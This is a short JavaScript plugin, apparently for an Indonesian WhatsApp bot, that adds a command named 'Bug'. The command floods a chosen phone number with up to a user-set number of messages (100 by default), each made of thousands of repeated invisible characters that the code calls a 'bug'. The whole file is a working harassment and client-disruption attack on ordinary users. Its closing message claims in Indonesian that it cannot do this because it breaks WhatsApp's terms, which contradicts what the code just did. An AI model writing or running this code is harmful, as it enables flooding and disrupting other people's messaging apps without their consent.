exports.default = {
   names: ['Bug'],
   tags: ['rmr'],
   command: ['rmr', 'rmr'],
   start: async (m, {
      conn,
      text,
      prefix,
      command,
      User,
      Format
   }) => {
      if (!text) return m.reply(`Contoh penggunaan: ${prefix + command} 628xxx`);

      let [nomor, jumlah] = text.split('|').map(v => v.trim());
      jumlah = parseInt(jumlah) || 100;

      if (!nomor.includes('@s.whatsapp.net')) {
         nomor = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      }

      let bug = '‍'.repeat(4000); // karakter bug invisible (zero width)

      for (let i = 0; i < jumlah; i++) {
         await conn.sendMessage(nomor, { text: bug });
      }

      m.reply(`Sukses mengirim bug ke ${nomor.split('@')[0]} sebanyak ${jumlah}x`);
      m.reply('𝙼𝙰𝙰𝙵 𝚂𝙰𝚈𝙰 𝚃𝙸𝙳𝙰𝙺 𝙱𝙸𝚂𝙰 𝙼𝙴𝙻𝙰𝙺𝚄𝙺𝙰𝙽 𝙸𝚃𝚄 𝙺𝙰𝚁𝙴𝙽𝙰 𝙱𝙸𝚂𝙰 𝙼𝙴𝙻𝙰𝙽𝙶𝙶𝙰𝙻 𝙺𝙴𝚃𝙴𝙽𝚃𝚄𝙰𝙽 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿')
      
   }
}